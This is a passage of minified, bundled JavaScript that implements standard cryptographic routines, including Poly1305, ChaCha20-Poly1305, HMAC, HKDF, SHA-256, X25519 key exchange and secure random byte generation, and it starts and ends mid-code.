Ne=Z;Ne+=p*re,Ne+=m*Y,Ne+=g*k,Ne+=w*N,Ne+=v*R,Z=Ne>>>13,Ne&=8191,Ne+=E*T,Ne+=I*f,Ne+=b*A,Ne+=_*C,Ne+=x*(5*W),Z+=Ne>>>13,Ne&=8191;var De=Z;De+=p*W,De+=m*re,De+=g*Y,De+=w*k,De+=v*N,Z=De>>>13,De&=8191,De+=E*R,De+=I*T,De+=b*f,De+=_*A,De+=x*C,Z+=De>>>13,De&=8191,Z=(Z<<2)+Z|0,Z=Z+se|0,se=Z&8191,Z=Z>>>13,de+=Z,p=se,m=de,g=Ee,w=Ce,v=ye,E=Ae,I=me,b=$e,_=Ne,x=De,c+=16,l-=16}this._h[0]=p,this._h[1]=m,this._h[2]=g,this._h[3]=w,this._h[4]=v,this._h[5]=E,this._h[6]=I,this._h[7]=b,this._h[8]=_,this._h[9]=x},a.prototype.finish=function(s,c){c===void 0&&(c=0);var l=new Uint16Array(10),u,p,m,g;if(this._leftover){for(g=this._leftover,this._buffer[g++]=1;g<16;g++)this._buffer[g]=0;this._fin=1,this._blocks(this._buffer,0,16)}for(u=this._h[1]>>>13,this._h[1]&=8191,g=2;g<10;g++)this._h[g]+=u,u=this._h[g]>>>13,this._h[g]&=8191;for(this._h[0]+=u*5,u=this._h[0]>>>13,this._h[0]&=8191,this._h[1]+=u,u=this._h[1]>>>13,this._h[1]&=8191,this._h[2]+=u,l[0]=this._h[0]+5,u=l[0]>>>13,l[0]&=8191,g=1;g<10;g++)l[g]=this._h[g]+u,u=l[g]>>>13,l[g]&=8191;for(l[9]-=8192,p=(u^1)-1,g=0;g<10;g++)l[g]&=p;for(p=~p,g=0;g<10;g++)this._h[g]=this._h[g]&p|l[g];for(this._h[0]=(this._h[0]|this._h[1]<<13)&65535,this._h[1]=(this._h[1]>>>3|this._h[2]<<10)&65535,this._h[2]=(this._h[2]>>>6|this._h[3]<<7)&65535,this._h[3]=(this._h[3]>>>9|this._h[4]<<4)&65535,this._h[4]=(this._h[4]>>>12|this._h[5]<<1|this._h[6]<<14)&65535,this._h[5]=(this._h[6]>>>2|this._h[7]<<11)&65535,this._h[6]=(this._h[7]>>>5|this._h[8]<<8)&65535,this._h[7]=(this._h[8]>>>8|this._h[9]<<5)&65535,m=this._h[0]+this._pad[0],this._h[0]=m&65535,g=1;g<8;g++)m=(this._h[g]+this._pad[g]|0)+(m>>>16)|0,this._h[g]=m&65535;return s[c+0]=this._h[0]>>>0,s[c+1]=this._h[0]>>>8,s[c+2]=this._h[1]>>>0,s[c+3]=this._h[1]>>>8,s[c+4]=this._h[2]>>>0,s[c+5]=this._h[2]>>>8,s[c+6]=this._h[3]>>>0,s[c+7]=this._h[3]>>>8,s[c+8]=this._h[4]>>>0,s[c+9]=this._h[4]>>>8,s[c+10]=this._h[5]>>>0,s[c+11]=this._h[5]>>>8,s[c+12]=this._h[6]>>>0,s[c+13]=this._h[6]>>>8,s[c+14]=this._h[7]>>>0,s[c+15]=this._h[7]>>>8,this._finished=!0,this},a.prototype.update=function(s){var c=0,l=s.length,u;if(this._leftover){u=16-this._leftover,u>l&&(u=l);for(var p=0;p<u;p++)this._buffer[this._leftover+p]=s[c+p];if(l-=u,c+=u,this._leftover+=u,this._leftover<16)return this;this._blocks(this._buffer,0,16),this._leftover=0}if(l>=16&&(u=l-l%16,this._blocks(s,c,u),c+=u,l-=u),l){for(var p=0;p<l;p++)this._buffer[this._leftover+p]=s[c+p];this._leftover+=l}return this},a.prototype.digest=function(){if(this._finished)throw new Error("Poly1305 was finished");var s=new Uint8Array(16);return this.finish(s),s},a.prototype.clean=function(){return n.wipe(this._buffer),n.wipe(this._r),n.wipe(this._h),n.wipe(this._pad),this._leftover=0,this._fin=0,this._finished=!0,this},a}();t.Poly1305=r;function o(a,s){var c=new r(a);c.update(s);var l=c.digest();return c.clean(),l}t.oneTimeAuth=o;function i(a,s){return a.length!==t.DIGEST_LENGTH||s.length!==t.DIGEST_LENGTH?!1:e.equal(a,s)}t.equal=i})(U1);(function(t){Object.defineProperty(t,"__esModule",{value:!0});var e=Qc,n=U1,r=gn,o=Se,i=Ir;t.KEY_LENGTH=32,t.NONCE_LENGTH=12,t.TAG_LENGTH=16;var a=new Uint8Array(16),s=function(){function c(l){if(this.nonceLength=t.NONCE_LENGTH,this.tagLength=t.TAG_LENGTH,l.length!==t.KEY_LENGTH)throw new Error("ChaCha20Poly1305 needs 32-byte key");this._key=new Uint8Array(l)}return c.prototype.seal=function(l,u,p,m){if(l.length>16)throw new Error("ChaCha20Poly1305: incorrect nonce length");var g=new Uint8Array(16);g.set(l,g.length-l.length);var w=new Uint8Array(32);e.stream(this._key,g,w,4);var v=u.length+this.tagLength,E;if(m){if(m.length!==v)throw new Error("ChaCha20Poly1305: incorrect destination length");E=m}else E=new Uint8Array(v);return e.streamXOR(this._key,g,u,E,4),this._authenticate(E.subarray(E.length-this.tagLength,E.length),w,E.subarray(0,E.length-this.tagLength),p),r.wipe(g),E},c.prototype.open=function(l,u,p,m){if(l.length>16)throw new Error("ChaCha20Poly1305: incorrect nonce length");if(u.length<this.tagLength)return null;var g=new Uint8Array(16);g.set(l,g.length-l.length);var w=new Uint8Array(32);e.stream(this._key,g,w,4);var v=new Uint8Array(this.tagLength);if(this._authenticate(v,w,u.subarray(0,u.length-this.tagLength),p),!i.equal(v,u.subarray(u.length-this.tagLength,u.length)))return null;var E=u.length-this.tagLength,I;if(m){if(m.length!==E)throw new Error("ChaCha20Poly1305: incorrect destination length");I=m}else I=new Uint8Array(E);return e.streamXOR(this._key,g,u.subarray(0,u.length-this.tagLength),I,4),r.wipe(g),I},c.prototype.clean=function(){return r.wipe(this._key),this},c.prototype._authenticate=function(l,u,p,m){var g=new n.Poly1305(u);m&&(g.update(m),m.length%16>0&&g.update(a.subarray(m.length%16))),g.update(p),p.length%16>0&&g.update(a.subarray(p.length%16));var w=new Uint8Array(8);m&&o.writeUint64LE(m.length,w),g.update(w),o.writeUint64LE(p.length,w),g.update(w);for(var v=g.digest(),E=0;E<v.length;E++)l[E]=v[E];g.clean(),r.wipe(v),r.wipe(w)},c}();t.ChaCha20Poly1305=s})(ef);var L1={},Xa={},tf={};Object.defineProperty(tf,"__esModule",{value:!0});function M8(t){return typeof t.saveState<"u"&&typeof t.restoreState<"u"&&typeof t.cleanSavedState<"u"}tf.isSerializableHash=M8;Object.defineProperty(Xa,"__esModule",{value:!0});var bn=tf,U8=Ir,B8=gn,j1=function(){function t(e,n){this._finished=!1,this._inner=new e,this._outer=new e,this.blockSize=this._outer.blockSize,this.digestLength=this._outer.digestLength;var r=new Uint8Array(this.blockSize);n.length>this.blockSize?this._inner.update(n).finish(r).clean():r.set(n);for(var o=0;o<r.length;o++)r[o]^=54;this._inner.update(r);for(var o=0;o<r.length;o++)r[o]^=106;this._outer.update(r),bn.isSerializableHash(this._inner)&&bn.isSerializableHash(this._outer)&&(this._innerKeyedState=this._inner.saveState(),this._outerKeyedState=this._outer.saveState()),B8.wipe(r)}return t.prototype.reset=function(){if(!bn.isSerializableHash(this._inner)||!bn.isSerializableHash(this._outer))throw new Error("hmac: can't reset() because hash doesn't implement restoreState()");return this._inner.restoreState(this._innerKeyedState),this._outer.restoreState(this._outerKeyedState),this._finished=!1,this},t.prototype.clean=function(){bn.isSerializableHash(this._inner)&&this._inner.cleanSavedState(this._innerKeyedState),bn.isSerializableHash(this._outer)&&this._outer.cleanSavedState(this._outerKeyedState),this._inner.clean(),this._outer.clean()},t.prototype.update=function(e){return this._inner.update(e),this},t.prototype.finish=function(e){return this._finished?(this._outer.finish(e),this):(this._inner.finish(e),this._outer.update(e.subarray(0,this.digestLength)).finish(e),this._finished=!0,this)},t.prototype.digest=function(){var e=new Uint8Array(this.digestLength);return this.finish(e),e},t.prototype.saveState=function(){if(!bn.isSerializableHash(this._inner))throw new Error("hmac: can't saveState() because hash doesn't implement it");return this._inner.saveState()},t.prototype.restoreState=function(e){if(!bn.isSerializableHash(this._inner)||!bn.isSerializableHash(this._outer))throw new Error("hmac: can't restoreState() because hash doesn't implement it");return this._inner.restoreState(e),this._outer.restoreState(this._outerKeyedState),this._finished=!1,this},t.prototype.cleanSavedState=function(e){if(!bn.isSerializableHash(this._inner))throw new Error("hmac: can't cleanSavedState() because hash doesn't implement it");this._inner.cleanSavedState(e)},t}();Xa.HMAC=j1;function L8(t,e,n){var r=new j1(t,e);r.update(n);var o=r.digest();return r.clean(),o}Xa.hmac=L8;Xa.equal=U8.equal;Object.defineProperty(L1,"__esModule",{value:!0});var I0=Xa,$0=gn,j8=function(){function t(e,n,r,o){r===void 0&&(r=new Uint8Array(0)),this._counter=new Uint8Array(1),this._hash=e,this._info=o;var i=I0.hmac(this._hash,r,n);this._hmac=new I0.HMAC(e,i),this._buffer=new Uint8Array(this._hmac.digestLength),this._bufpos=this._buffer.length}return t.prototype._fillBuffer=function(){this._counter[0]++;var e=this._counter[0];if(e===0)throw new Error("hkdf: cannot expand more");this._hmac.reset(),e>1&&this._hmac.update(this._buffer),this._info&&this._hmac.update(this._info),this._hmac.update(this._counter),this._hmac.finish(this._buffer),this._bufpos=0},t.prototype.expand=function(e){for(var n=new Uint8Array(e),r=0;r<n.length;r++)this._bufpos===this._buffer.length&&this._fillBuffer(),n[r]=this._buffer[this._bufpos++];return n},t.prototype.clean=function(){this._hmac.clean(),$0.wipe(this._buffer),$0.wipe(this._counter),this._bufpos=0},t}(),F8=L1.HKDF=j8,el={},tl={},nl={};Object.defineProperty(nl,"__esModule",{value:!0});nl.BrowserRandomSource=void 0;const O0=65536;class W8{constructor(){this.isAvailable=!1,this.isInstantiated=!1;const e=typeof self<"u"?self.crypto||self.msCrypto:null;e&&e.getRandomValues!==void 0&&(this._crypto=e,this.isAvailable=!0,this.isInstantiated=!0)}randomBytes(e){if(!this.isAvailable||!this._crypto)throw new Error("Browser random byte generator is not available.");const n=new Uint8Array(e);for(let r=0;r<n.length;r+=O0)this._crypto.getRandomValues(n.subarray(r,r+Math.min(n.length-r,O0)));return n}}nl.BrowserRandomSource=W8;function z8(t){throw new Error('Could not dynamically require "'+t+'". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')}var rl={};const H8={},V8=Object.freeze(Object.defineProperty({__proto__:null,default:H8},Symbol.toStringTag,{value:"Module"})),Z8=cp(V8);Object.defineProperty(rl,"__esModule",{value:!0});rl.NodeRandomSource=void 0;const G8=gn;class q8{constructor(){if(this.isAvailable=!1,this.isInstantiated=!1,typeof z8<"u"){const e=Z8;e&&e.randomBytes&&(this._crypto=e,this.isAvailable=!0,this.isInstantiated=!0)}}randomBytes(e){if(!this.isAvailable||!this._crypto)throw new Error("Node.js random byte generator is not available.");let n=this._crypto.randomBytes(e);if(n.length!==e)throw new Error("NodeRandomSource: got fewer bytes than requested");const r=new Uint8Array(e);for(let o=0;o<r.length;o++)r[o]=n[o];return(0,G8.wipe)(n),r}}rl.NodeRandomSource=q8;Object.defineProperty(tl,"__esModule",{value:!0});tl.SystemRandomSource=void 0;const K8=nl,Y8=rl;class J8{constructor(){if(this.isAvailable=!1,this.name="",this._source=new K8.BrowserRandomSource,this._source.isAvailable){this.isAvailable=!0,this.name="Browser";return}if(this._source=new Y8.NodeRandomSource,this._source.isAvailable){this.isAvailable=!0,this.name="Node";return}}randomBytes(e){if(!this.isAvailable)throw new Error("System random byte generator is not available.");return this._source.randomBytes(e)}}tl.SystemRandomSource=J8;(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.randomStringForEntropy=t.randomString=t.randomUint32=t.randomBytes=t.defaultRandomSource=void 0;const e=tl,n=Se,r=gn;t.defaultRandomSource=new e.SystemRandomSource;function o(l,u=t.defaultRandomSource){return u.randomBytes(l)}t.randomBytes=o;function i(l=t.defaultRandomSource){const u=o(4,l),p=(0,n.readUint32LE)(u);return(0,r.wipe)(u),p}t.randomUint32=i;const a="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";function s(l,u=a,p=t.defaultRandomSource){if(u.length<2)throw new Error("randomString charset is too short");if(u.length>256)throw new Error("randomString charset is too long");let m="";const g=u.length,w=256-256%g;for(;l>0;){const v=o(Math.ceil(l*256/w),p);for(let E=0;E<v.length&&l>0;E++){const I=v[E];I<w&&(m+=u.charAt(I%g),l--)}(0,r.wipe)(v)}return m}t.randomString=s;function c(l,u=a,p=t.defaultRandomSource){const m=Math.ceil(l/(Math.log(u.length)/Math.LN2));return s(m,u,p)}t.randomStringForEntropy=c})(el);var il={};(function(t){Object.defineProperty(t,"__esModule",{value:!0});var e=Se,n=gn;t.DIGEST_LENGTH=32,t.BLOCK_SIZE=64;var r=function(){function s(){this.digestLength=t.DIGEST_LENGTH,this.blockSize=t.BLOCK_SIZE,this._state=new Int32Array(8),this._temp=new Int32Array(64),this._buffer=new Uint8Array(128),this._bufferLength=0,this._bytesHashed=0,this._finished=!1,this.reset()}return s.prototype._initState=function(){this._state[0]=1779033703,this._state[1]=3144134277,this._state[2]=1013904242,this._state[3]=2773480762,this._state[4]=1359893119,this._state[5]=2600822924,this._state[6]=528734635,this._state[7]=1541459225},s.prototype.reset=function(){return this._initState(),this._bufferLength=0,this._bytesHashed=0,this._finished=!1,this},s.prototype.clean=function(){n.wipe(this._buffer),n.wipe(this._temp),this.reset()},s.prototype.update=function(c,l){if(l===void 0&&(l=c.length),this._finished)throw new Error("SHA256: can't update because hash was finished.");var u=0;if(this._bytesHashed+=l,this._bufferLength>0){for(;this._bufferLength<this.blockSize&&l>0;)this._buffer[this._bufferLength++]=c[u++],l--;this._bufferLength===this.blockSize&&(i(this._temp,this._state,this._buffer,0,this.blockSize),this._bufferLength=0)}for(l>=this.blockSize&&(u=i(this._temp,this._state,c,u,l),l%=this.blockSize);l>0;)this._buffer[this._bufferLength++]=c[u++],l--;return this},s.prototype.finish=function(c){if(!this._finished){var l=this._bytesHashed,u=this._bufferLength,p=l/536870912|0,m=l<<3,g=l%64<56?64:128;this._buffer[u]=128;for(var w=u+1;w<g-8;w++)this._buffer[w]=0;e.writeUint32BE(p,this._buffer,g-8),e.writeUint32BE(m,this._buffer,g-4),i(this._temp,this._state,this._buffer,0,g),this._finished=!0}for(var w=0;w<this.digestLength/4;w++)e.writeUint32BE(this._state[w],c,w*4);return this},s.prototype.digest=function(){var c=new Uint8Array(this.digestLength);return this.finish(c),c},s.prototype.saveState=function(){if(this._finished)throw new Error("SHA256: cannot save finished state");return{state:new Int32Array(this._state),buffer:this._bufferLength>0?new Uint8Array(this._buffer):void 0,bufferLength:this._bufferLength,bytesHashed:this._bytesHashed}},s.prototype.restoreState=function(c){return this._state.set(c.state),this._bufferLength=c.bufferLength,c.buffer&&this._buffer.set(c.buffer),this._bytesHashed=c.bytesHashed,this._finished=!1,this},s.prototype.cleanSavedState=function(c){n.wipe(c.state),c.buffer&&n.wipe(c.buffer),c.bufferLength=0,c.bytesHashed=0},s}();t.SHA256=r;var o=new Int32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]);function i(s,c,l,u,p){for(;p>=64;){for(var m=c[0],g=c[1],w=c[2],v=c[3],E=c[4],I=c[5],b=c[6],_=c[7],x=0;x<16;x++){var C=u+x*4;s[x]=e.readUint32BE(l,C)}for(var x=16;x<64;x++){var A=s[x-2],f=(A>>>17|A<<15)^(A>>>19|A<<13)^A>>>10;A=s[x-15];var T=(A>>>7|A<<25)^(A>>>18|A<<14)^A>>>3;s[x]=(f+s[x-7]|0)+(T+s[x-16]|0)}for(var x=0;x<64;x++){var f=(((E>>>6|E<<26)^(E>>>11|E<<21)^(E>>>25|E<<7))+(E&I^~E&b)|0)+(_+(o[x]+s[x]|0)|0)|0,T=((m>>>2|m<<30)^(m>>>13|m<<19)^(m>>>22|m<<10))+(m&g^m&w^g&w)|0;_=b,b=I,I=E,E=v+f|0,v=w,w=g,g=m,m=f+T|0}c[0]+=m,c[1]+=g,c[2]+=w,c[3]+=v,c[4]+=E,c[5]+=I,c[6]+=b,c[7]+=_,u+=64,p-=64}return u}function a(s){var c=new r;c.update(s);var l=c.digest();return c.clean(),l}t.hash=a})(il);var nf={};(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.sharedKey=t.generateKeyPair=t.generateKeyPairFromSeed=t.scalarMultBase=t.scalarMult=t.SHARED_KEY_LENGTH=t.SECRET_KEY_LENGTH=t.PUBLIC_KEY_LENGTH=void 0;const e=el,n=gn;t.PUBLIC_KEY_LENGTH=32,t.SECRET_KEY_LENGTH=32,t.SHARED_KEY_LENGTH=32;function r(x){const C=new Float64Array(16);if(x)for(let A=0;A<x.length;A++)C[A]=x[A];return C}const o=new Uint8Array(32);o[0]=9;const i=r([56129,1]);function a(x){let C=1;for(let A=0;A<16;A++){let f=x[A]+C+65535;C=Math.floor(f/65536),x[A]=f-C*65536}x[0]+=C-1+37*(C-1)}function s(x,C,A){const f=~(A-1);for(let T=0;T<16;T++){const R=f&(x[T]^C[T]);x[T]^=R,C[T]^=R}}function c(x,C){const A=r(),f=r();for(let T=0;T<16;T++)f[T]=C[T];a(f),a(f),a(f);for(let T=0;T<2;T++){A[0]=f[0]-65517;for(let N=1;N<15;N++)A[N]=f[N]-65535-(A[N-1]>>16&1),A[N-1]&=65535;A[15]=f[15]-32767-(A[14]>>16&1);const R=A[15]>>16&1;A[14]&=65535,s(f,A,1-R)}for(let T=0;T<16;T++)x[2*T]=f[T]&255,x[2*T+1]=f[T]>>8}function l(x,C){for(let A=0;A<16;A++)x[A]=C[2*A]+(C[2*A+1]<<8);x[15]&=32767}function u(x,C,A){for(let f=0;f<16;f++)x[f]=C[f]+A[f]}function p(x,C,A){for(let f=0;f<16;f++)x[f]=C[f]-A[f]}function m(x,C,A){let f,T,R=0,N=0,k=0,Y=0,re=0,W=0,L=0,U=0,B=0,j=0,X=0,ne=0,Q=0,oe=0,Z=0,se=0,de=0,Ee=0,Ce=0,ye=0,Ae=0,me=0,$e=0,Ne=0,De=0,kt=0,Jn=0,$r=0,Xn=0,mo=0,rs=0,ct=A[0],tt=A[1],je=A[2],it=A[3],ut=A[4],Ve=A[5],dt=A[6],y=A[7],d=A[8],h=A[9],S=A[10],P=A[11],D=A[12],M=A[13],ce=A[14],Ie=A[15];f=C[0],R+=f*ct,N+=f*tt,k+=f*je,Y+=f*it,re+=f*ut,W+=f*Ve,L+=f*dt,U+=f*y,B+=f*d,j+=f*h,X+=f*S,ne+=f*P,Q+=f*D,oe+=f*M,Z+=f*ce,se+=f*Ie,f=C[1],N+=f*ct,k+=f*tt,Y+=f*je,re+=f*it,W+=f*ut,L+=f*Ve,U+=f*dt,B+=f*y,j+=f*d,X+=f*h,ne+=f*S,Q+=f*P,oe+=f*D,Z+=f*M,se+=f*ce,de+=f*Ie,f=C[2],k+=f*ct,Y+=f*tt,re+=f*je,W+=f*it,L+=f*ut,U+=f*Ve,B+=f*dt,j+=f*y,X+=f*d,ne+=f*h,Q+=f*S,oe+=f*P,Z+=f*D,se+=f*M,de+=f*ce,Ee+=f*Ie,f=C[3],Y+=f*ct,re+=f*tt,W+=f*je,L+=f*it,U+=f*ut,B+=f*Ve,j+=f*dt,X+=f*y,ne+=f*d,Q+=f*h,oe+=f*S,Z+=f*P,se+=f*D,de+=f*M,Ee+=f*ce,Ce+=f*Ie,f=C[4],re+=f*ct,W+=f*tt,L+=f*je,U+=f*it,B+=f*ut,j+=f*Ve,X+=f*dt,ne+=f*y,Q+=f*d,oe+=f*h,Z+=f*S,se+=f*P,de+=f*D,Ee+=f*M,Ce+=f*ce,ye+=f*Ie,f=C[5],W+=f*ct,L+=f*tt,U+=f*je,B+=f*it,j+=f*ut,X+=f*Ve,ne+=f*dt,Q+=f*y,oe+=f*d,Z+=f*h,se+=f*S,de+=f*P,Ee+=f*D,Ce+=f*M,ye+=f*ce,Ae+=f*Ie,f=C[6],L+=f*ct,U+=f*tt,B+=f*je,j+=f*it,X+=f*ut,ne+=f*Ve,Q+=f*dt,oe+=f*y,Z+=f*d,se+=f*h,de+=f*S,Ee+=f*P,Ce+=f*D,ye+=f*M,Ae+=f*ce,me+=f*Ie,f=C[7],U+=f*ct,B+=f*tt,j+=f*je,X+=f*it,ne+=f*ut,Q+=f*Ve,oe+=f*dt,Z+=f*y,se+=f*d,de+=f*h,Ee+=f*S,Ce+=f*P,ye+=f*D,Ae+=f*M,me+=f*ce,$e+=f*Ie,f=C[8],B+=f*ct,j+=f*tt,X+=f*je,ne+=f*it,Q+=f*ut,oe+=f*Ve,Z+=f*dt,se+=f*y,de+=f*d,Ee+=f*h,Ce+=f*S,ye+=f*P,Ae+=f*D,me+=f*M,$e+=f*ce,Ne+=f*Ie,f=C[9],j+=f*ct,X+=f*tt,ne+=f*je,Q+=f*it,oe+=f*ut,Z+=f*Ve,se+=f*dt,de+=f*y,Ee+=f*d,Ce+=f*h,ye+=f*S,Ae+=f*P,me+=f*D,$e+=f*M,Ne+=f*ce,De+=f*Ie,f=C[10],X+=f*ct,ne+=f*tt,Q+=f*je,oe+=f*it,Z+=f*ut,se+=f*Ve,de+=f*dt,Ee+=f*y,Ce+=f*d,ye+=f*h,Ae+=f*S,me+=f*P,$e+=f*D,Ne+=f*M,De+=f*ce,kt+=f*Ie,f=C[11],ne+=f*ct,Q+=f*tt,oe+=f*je,Z+=f*it,se+=f*ut,de+=f*Ve,Ee+=f*dt,Ce+=f*y,ye+=f*d,Ae+=f*h,me+=f*S,$e+=f*P,Ne+=f*D,De+=f*M,kt+=f*ce,Jn+=f*Ie,f=C[12],Q+=f*ct,oe+=f*tt,Z+=f*je,se+=f*it,de+=f*ut,Ee+=f*Ve,Ce+=f*dt,ye+=f*y,Ae+=f*d,me+=f*h,$e+=f*S,Ne+=f*P,De+=f*D,kt+=f*M,Jn+=f*ce,$r+=f*Ie,f=C[13],oe+=f*ct,Z+=f*tt,se+=f*je,de+=f*it,Ee+=f*ut,Ce+=f*Ve,ye+=f*dt,Ae+=f*y,me+=f*d,$e+=f*h,Ne+=f*S,De+=f*P,kt+=f*D,Jn+=f*M,$r+=f*ce,Xn+=f*Ie,f=C[14],Z+=f*ct,se+=f*tt,de+=f*je,Ee+=f*it,Ce+=f*ut,ye+=f*Ve,Ae+=f*dt,me+=f*y,$e+=f*d,Ne+=f*h,De+=f*S,kt+=f*P,Jn+=f*D,$r+=f*M,Xn+=f*ce,mo+=f*Ie,f=C[15],se+=f*ct,de+=f*tt,Ee+=f*je,Ce+=f*it,ye+=f*ut,Ae+=f*Ve,me+=f*dt,$e+=f*y,Ne+=f*d,De+=f*h,kt+=f*S,Jn+=f*P,$r+=f*D,Xn+=f*M,mo+=f*ce,rs+=f*Ie,R+=38*de,N+=38*Ee,k+=38*Ce,Y+=38*ye,re+=38*Ae,W+=38*me,L+=38*$e,U+=38*Ne,B+=38*De,j+=38*kt,X+=38*Jn,ne+=38*$r,Q+=38*Xn,oe+=38*mo,Z+=38*rs,T=1,f=R+T+65535,T=Math.floor(f/65536),R=f-T*65536,f=N+T+65535,T=Math.floor(f/65536),N=f-T*65536,f=k+T+65535,T=Math.floor(f/65536),k=f-T*65536,f=Y+T+65535,T=Math.floor(f/65536),Y=f-T*65536,f=re+T+65535,T=Math.floor(f/65536),re=f-T*65536,f=W+T+65535,T=Math.floor(f/65536),W=f-T*65536,f=L+T+65535,T=Math.floor(f/65536),L=f-T*65536,f=U+T+65535,T=Math.floor(f/65536),U=f-T*65536,f=B+T+65535,T=Math.floor(f/65536),B=f-T*65536,f=j+T+65535,T=Math.floor(f/65536),j=f-T*65536,f=X+T+65535,T=Math.floor(f/65536),X=f-T*65536,f=ne+T+65535,T=Math.floor(f/65536),ne=f-T*65536,f=Q+T+65535,T=Math.floor(f/65536),Q=f-T*65536,f=oe+T+65535,T=Math.floor(f/65536),oe=f-T*65536,f=Z+T+65535,T=Math.floor(f/65536),Z=f-T*65536,f=se+T+65535,T=Math.floor(f/65536),se=f-T*65536,R+=T-1+37*(T-1),T=1,f=R+T+65535,T=Math.floor(f/65536),R=f-T*65536,f=N+T+65535,T=Math.floor(f/65536),N=f-T*65536,f=k+T+65535,T=Math.floor(f/65536),k=f-T*65536,f=Y+T+65535,T=Math.floor(f/65536),Y=f-T*65536,f=re+T+65535,T=Math.floor(f/65536),re=f-T*65536,f=W+T+65535,T=Math.floor(f/65536),W=f-T*65536,f=L+T+65535,T=Math.floor(f/65536),L=f-T*65536,f=U+T+65535,T=Math.floor(f/65536),U=f-T*65536,f=B+T+65535,T=Math.floor(f/65536),B=f-T*65536,f=j+T+65535,T=Math.floor(f/65536),j=f-T*65536,f=X+T+65535,T=Math.floor(f/65536),X=f-T*65536,f=ne+T+65535,T=Math.floor(f/65536),ne=f-T*65536,f=Q+T+65535,T=Math.floor(f/65536),Q=f-T*65536,f=oe+T+65535,T=Math.floor(f/65536),oe=f-T*65536,f=Z+T+65535,T=Math.floor(f/65536),Z=f-T*65536,f=se+T+65535,T=Math.floor(f/65536),se=f-T*65536,R+=T-1+37*(T-1),x[0]=R,x[1]=N,x[2]=k,x[3]=Y,x[4]=re,x[5]=W,x[6]=L,x[7]=U,x[8]=B,x[9]=j,x[10]=X,x[11]=ne,x[12]=Q,x[13]=oe,x[14]=Z,x[15]=se}function g(x,C){m(x,C,C)}function w(x,C){const A=r();for(let f=0;f<16;f++)A[f]=C[f];for(let f=253;f>=0;f--)g(A,A),f!==2&&f!==4&&m(A,A,C);for(let f=0;f<16;f++)x[f]=A[f]}function v(x,C){const A=new Uint8Array(32),f=new Float64Array(80),T=r(),R=r(),N=r(),k=r(),Y=r(),re=r();for(let B=0;B<31;B++)A[B]=x[B];A[31]=x[31]&127|64,A[0]&=248,l(f,C);for(let B=0;B<16;B++)R[B]=f[B];T[0]=k[0]=1;for(let B=254;B>=0;--B){const j=A[B>>>3]>>>(B&7)&1;s(T,R,j),s(N,k,j),u(Y,T,N),p(T,T,N),u(N,R,k),p(R,R,k),g(k,Y),g(re,T),m(T,N,T),m(N,R,Y),u(Y,T,N),p(T,T,N),g(R,T),p(N,k,re),m(T,N,i),u(T,T,k),m(N,N,T),m(T,k,re),m(k,R,f),g(R,Y),s(T,R,j),s(N,k,j)}for(let B=0;B<16;B++)f[B+16]=T[B],f[B+32]=N[B],f[B+48]=R[B],f[B+64]=k[B];const W=f.subarray(32),L=f.subarray(16);w(W,W),m(L,L,W);const U=new Uint8Array(32);return c(U,L),U}t.scalarMult=v;function E(x){return v(x,o)}t.scalarMultBase=E;function I(x){if(x.length!==t.SECRET_KEY_LENGTH)throw new Error(`x25519: seed must be ${t.SECRET_KEY_LENGTH} bytes`);const C=new Uint8Array(x);return{publicKey:E(C),secretKey:C}}t.generateKeyPairFromSeed=I;function b(x){const C=(0,e.randomBytes)(32,x),A=I(C);return(0,n.wipe)(C),A}t.generateKeyPair=b;function _(x,C,A=!1){if(x.length!==t.PUBLIC_KEY_LENGTH)throw new Error("X25519: incorrect secret key length");if(C.length!==t.PUBLIC_KEY_LENGTH)throw new Error("X25519: incorrect public key length");const f=v(x,C);if(A){let T=0;for(let R=0;R<f.length;R++)T|=f[R];if(T===0)throw new Error("X25519: invalid shared key")}return f}t.sharedKey=_})(nf);function rf(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function F1(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?rf(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function P0(t,e){e||(e=t.reduce((o,i)=>o+i.length,0));const n=F1(e);let r=0;for(const o of t)n.set(o,r),r+=o.length;return rf(n)}function X8(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var o=0;o<t.length;o++){var i=t.charAt(o),a=i.charCodeAt(0);if(n[a]!==255)throw new TypeError(i+" is ambiguous");n[a]=o}var s=t.length,c=t.charAt(0),l=Math.log(s)/Math.log(256),u=Math.log(256)/Math.log(s);function p(w){if(w instanceof Uint8Array||(ArrayBuffer.isView(w)?w=new Uint8Array(w.buffer,w.byteOffset,w.byteLength):Array.isArray(w)&&(w=Uint8Array.from(w))),!(w instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(w.length===0)return"";for(var v=0,E=0,I=0,b=w.length;I!==b&&w[I]===0;)I++,v++;for(var _=(b-I)*u+1>>>0,x=new Uint8Array(_);I!==b;){for(var C=w[I],A=0,f=_-1;(C!==0||A<E)&&f!==-1;f--,A++)C+=256*x[f]>>>0,x[f]=C%s>>>0,C=C/s>>>0;if(C!==0)throw new Error("Non-zero carry");E=A,I++}for(var T=_-E;T!==_&&x[T]===0;)T++;for(var R=c.repeat(v);T<_;++T)R+=t.charAt(x[T]);return R}function m(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return new Uint8Array;var v=0;if(w[v]!==" "){for(var E=0,I=0;w[v]===c;)E++,v++;for(var b=(w.length-v)*l+1>>>0,_=new Uint8Array(b);w[v];){var x=n[w.charCodeAt(v)];if(x===255)return;for(var 